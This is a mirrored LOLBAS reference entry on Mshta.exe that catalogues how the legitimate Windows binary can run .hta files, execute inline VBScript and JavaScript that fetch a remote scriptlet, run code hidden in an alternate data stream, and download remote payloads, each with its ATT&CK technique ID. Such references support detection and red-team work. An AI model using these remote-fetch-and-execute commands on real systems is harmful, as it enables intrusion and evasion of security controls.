# LOLBAS: Mshta.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `ADS`, `Download`, `Execute`

Used by Windows to execute html applications. (.hta)

## Comandos

### Execute code

Execute · priv: User · T1218.005

```cmd
mshta.exe {PATH:.hta}
```

Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.

### Execute code

Execute · priv: User · T1218.005

```cmd
mshta.exe vbscript:Close(Execute("GetObject(""script:{REMOTEURL:.sct}"")"))
```

Executes VBScript supplied as a command line argument.

### Execute code

Execute · priv: User · T1218.005

```cmd
mshta.exe javascript:a=GetObject("script:{REMOTEURL:.sct}").Exec();close();
```

Executes JavaScript supplied as a command line argument.

### Execute code hidden in alternate data stream

ADS · priv: User · T1218.005

```cmd
mshta.exe "{PATH_ABSOLUTE}:file.hta"
```

Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.

### Downloads payload from remote server

Download · priv: User · T1105

```cmd
mshta.exe {REMOTEURL}
```

It will download a remote payload and place it in INetCache.

